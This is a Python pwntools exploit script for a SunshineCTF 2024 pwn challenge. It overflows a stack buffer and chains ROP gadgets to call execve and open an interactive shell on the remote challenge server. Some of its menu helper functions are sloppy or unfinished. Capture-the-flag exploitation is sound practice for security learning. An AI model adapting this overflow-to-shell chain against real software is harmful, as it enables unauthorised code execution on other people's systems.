#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="debug",
        os="linux",
        terminal=["xfce4-terminal", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "2024.sunshinectf.games"
PORT = 24004

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

def create(p, size, value):
    ru(p,b"")
    sl(p,b"%i" % size)
    ru(p,b"")
    sl(value)

def edit(p, index, value):
    ru(p,b"")
    sl(p,"%i" % index)
    ru(p,b"")
    sl(p,value)

def delete(p, index):
    ru(p,b"")
    sl(p,"%i" % index)

def view(p, index):
    ru(p,b"")
    sl(p,"%i" % index)
    ru(p,b"")
    return rl(p)
    

def exploit(io,e):
    pop_rdx = 0x401ba1
    pop_rax = 0x40200d
    pop_rdi = 0x401499
    pop_rsi_sys = 0x402077

    payload = b"A"*0x108
    #payload += p64(0x401016) # ret
    payload += p64(pop_rax)
    payload += p64(59)
    payload += p64(pop_rdx)
    payload += p64(0)
    payload += p64(pop_rdi)
    payload += p64(0x405914)
    payload += p64(pop_rsi_sys)
    payload += p64(0)

    io.sendlineafter(b"verb >>>", b"SAFE")
    io.sendlineafter(b"params >>>", b"N")
    io.sendlineafter(b"verb >>>", b"CAMO")
    io.sendlineafter(b"params >>>", b"N")

    io.sendlineafter(b"developers >>>", payload)

    io.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    #l = ELF("./libc.so.6")

    exploit(p,e)
